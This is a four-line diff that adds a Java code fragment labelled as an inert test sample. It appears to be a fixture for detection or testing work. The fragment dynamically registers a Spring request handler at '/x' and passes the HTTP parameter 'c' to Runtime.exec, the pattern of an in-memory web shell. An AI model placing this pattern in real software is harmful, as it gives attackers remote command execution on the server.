@@ -1,0 +1,4 @@
+// INERT TEST SAMPLE
+RequestMappingHandlerMapping m; m.registerMapping(RequestMappingInfo.paths("/x").build(), h, meth);
+Runtime.getRuntime().exec(request.getParameter("c"));
+
